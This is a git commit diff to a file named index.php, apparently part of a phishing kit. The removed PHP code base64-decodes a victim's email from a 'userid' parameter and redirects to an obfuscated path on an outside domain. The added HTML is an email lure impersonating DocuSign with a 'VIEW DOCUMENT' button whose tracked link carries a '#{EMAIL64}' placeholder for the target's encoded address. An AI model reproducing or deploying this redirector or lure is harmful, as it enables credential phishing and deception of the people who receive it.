e2702765d03661922f37ff7421f1988250db0b93
nh6559 <158509227+nh6559@users.noreply.github.com>
2024-02-09 05:25:53 -0800

    index.php

--- index.php
+++ index.php
@@ -1,26 +1,98 @@
-<?php
-function isBase64($data)
-{
-    if (base64_encode(base64_decode($data)) === $data) {
-        return true;
-    } else {
-        return false;
-    }
-}
-
-function decode($email){
-
-		if(isBase64($email)){
-			 $email = base64_decode($email,false);
-		}
-
-       header( "refresh:0;url=https://isc-secure.net/jfjnfdnjsbgfmbgjgfdjkesvd/gfbrhnyjyjnnjynyjnyyt/temp/".$email);
-
-}
-if(isset($_GET['userid']) && !empty($_GET['userid'])){
-   $email = $_GET['userid'];
-   decode($email);
-}
-
-
-?>
+<p><span style="font-size:26px;"><strong>Docu Sign</strong></span></p>
+<center>
+<div class="aw-email-document aw-WrqFo">
+<div align="center">
+<table width="100%" align="left" style="border: 0px currentColor; border-image: none; border-collapse: collapse; border-spacing: 0px;" bgcolor="#ffffff" cellspacing="0" cellpadding="0">
+    <tbody>
+        <tr>
+            <td width="100%" align="left" class="mobile-padding" style="border: 0px currentColor; border-image: none; border-collapse: collapse; min-width: 100%; max-width: 600px; border-spacing: 0px;">
+            <!--[if !mso]><!-->
+            <table width="100%" align="left" style="border: 0px currentColor; border-image: none; border-collapse: collapse; max-width: 600px; border-spacing: 0px;" cellspacing="0" cellpadding="0">
+                <!--<![endif]-->
+                <!--[if gte mso 9]><table align="left" cellpadding="0" cellspacing="0" width="600"><![endif]-->
+                <tbody>
+                    <tr>
+                        <td class="aw-bgc" style="border: 0px currentColor; border-image: none; border-collapse: collapse; border-spacing: 0px;" bgcolor="#ffffff">
+                        <div align="left" style="color: rgb(0, 0, 0); min-width: 100%;">
+                        <div class="region">
+                        <div>
+                        <table class="row aw-stack" role="presentation" style="border: 0px currentColor; border-image: none; width: 100%; border-collapse: collapse; border-spacing: 0px;">
+                            <tbody>
+                                <tr>
+                                    <td width="100%" class="container aw-QMnXL" valign="top" style="padding: 0px; border-radius: 0px; border: 0px currentcolor; width: 100%; border-collapse: collapse; border-spacing: 0px; background-color: rgb(35, 56, 188);">
+                                    <div class="definition-parent">
+                                    <div class="text-element paragraph"></div>
+                                    </div>
+                                    <div class="definition-parent">
+                                    <div class="text-element paragraph">
+                                    <p style="margin: 0px;"><span style="font-family: Helvetica, sans-serif; font-size: 24px;">&nbsp;</span></p>
+                                    <p style="margin: 0px;"><span style="font-family: Helvetica, sans-serif; font-size: 24px;">&nbsp;</span></p>
+                                    <p style="margin: 0px;"><span style="font-family: Helvetica, sans-serif; font-size: 24px;">&nbsp; &nbsp;E-signature sent you a document to review and sign</span></p>
+                                    <p style="margin: 0px;">&nbsp;</p>
+                                    </div>
+                                    </div>
+                                    <div class="definition-parent"><!--Button-->
+                                    <table width="100%" class="aw-button" style="border: 0px currentColor; border-image: none; border-collapse: collapse; border-spacing: 0px;">
+                                        <tbody>
+                                            <tr>
+                                                <td style="padding: 10px 0px; border: 0px currentColor; border-image: none; border-collapse: collapse; border-spacing: 0px;">
+                                                <table width="100%" style="border: 0px currentcolor; border-collapse: collapse; border-spacing: 0px; width: 621px; height: 165px;" border="0" cellspacing="0" cellpadding="0">
+                                                    <tbody>
+                                                        <tr>
+                                                            <td align="center" style="border: 0px currentColor; border-image: none; border-collapse: collapse; border-spacing: 0px;">
+                                                            <p>&nbsp;</p>
+                                                            <p>&nbsp;</p>
+                                                            <table style="border: 0px currentColor; border-image: none; border-collapse: collapse; border-spacing: 0px;" border="0" cellspacing="0" cellpadding="0">
+                                                                <tbody>
+                                                                    <tr>
+                                                                        <td align="center" style="border-radius: 5px; border: 0px currentColor; border-image: none; border-collapse: collapse; border-spacing: 0px;" bgcolor="#c7ca23">
+                                                                        <!--[if mso]><table border="0" cellspacing="0" cellpadding="0"><tr><td style="padding: 10px 40px;"><![endif]-->
+                                                                        <a style="padding: 8px 14px; border-radius: 5px; border: 1px solid rgb(199, 202, 35); border-image: none; text-align: center; color: rgb(0, 0, 0); font-family: Helvetica, Arial, sans-serif; font-size: 15px; font-weight: 600; text-decoration: none; display: block;" href="https://link.mail.beehiiv.com/ls/click?upn=ZdCnajdddl2-2BXq2PAuBcR-2BdY-2FLx8YmTTP-2BahSNqndbyqzc1aWoHk4r1LBukVQJ705cWST793tNY4zVxEuUv0D-2BdH7HZF8xWqf0tLePwE6uZAwp0u4QNo7sGPtQmBAuhaxk-2F-2Bm1QbxsArqRJ3KdsrNTxKW8WKJebMLmKC0lSFVybhigDZmPVYZlZoiTjCuHQ5V7kRoqhEpScE8aMXr7swzQ-3D-3DuXo4_jlZe1ncSZA7fOhirGWDdm9mFn4BftUpn6Uabu3OQkpTg-2B8mdxJQ5VHPNyixNwXCR9x1MwQleRTs3kzrkuH4Fbiq0LRokCrXzxoS0vwYsq2YVuIXoVgnOVAyaqLGC-2FhxXv3fd3CPMbDRvUX2uB5UqAtZxsR-2FEcTTctzdQhtZ09JkUQt4Cx9LiZINexxEKTASZRa0JZ395zXw7krZsquHoYPcD86a5Vr8gAoN1QMgpU3bBuXypyiLOKKcVHH0Nht9dpbxE6jyNeRVCaz3x-2FbYh4G9Rnf2Laodz8sFtlthG-2Fl-2Fg6RttezWTghnokY9IZTbU89CMWmcfjFFamm701OE1OxCFoFammTuGIghPwBl-2FQYkMF2LYYynUCb8z4FMfkT9mSnrpM8nI9Fxrkxj0-2FLvhwZhxA2yyDOpqteZYAXyHCWJl-2BFj7f1p3iSmC3qaXny3mxXziS-2BAGJuL1lPkulHTFzw-3D-3D#{EMAIL64}" target="_blank" rel="noopener noreferrer">
+                                                                        <span style="color: rgb(0, 0, 0); font-family: Helvetica, Arial, sans-serif; font-size: 15px; font-weight: 600;">VIEW DOCUMENT</span>
+                                                                        </a>
+                                                                        <!--[if mso]></td></tr></table><![endif]-->
+                                                                        </td>
+                                                                    </tr>
+                                                                </tbody>
+                                                            </table>
+                                                            </td>
+                                                        </tr>
+                                                    </tbody>
+                                                </table>
+                                                </td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                    </div>
+                                    <div class="definition-parent">
+                                    <div class="text-element paragraph"></div>
+                                    </div>
+                                    <div class="definition-parent">
+                                    <div class="text-element paragraph"></div>
+                                    </div>
+                                    </td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        </div>
+                        </div>
+                        </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+            </td>
+        </tr>
+    </tbody>
+</table>
+<div style="clear: both;"></div>
+</div>
+</div>
+</center>
+<div>&nbsp;</div>
+<div align="center" id="aweber_container" style="width: 100% !important; background-color: rgb(255, 255, 255);">
+<div id="aweber_rem" style="margin: 0px; padding: 0px 8px; width: 100%; color: rgb(0, 0, 0) !important; line-height: 16px; font-family: Helvetica,Arial,sans-serif !important; font-size: 12px !important; max-width: 600px; box-sizing: border-box;">
+<div class="rem_align" style="text-align: center;"><br>
+</div>
+</div>
+</div>
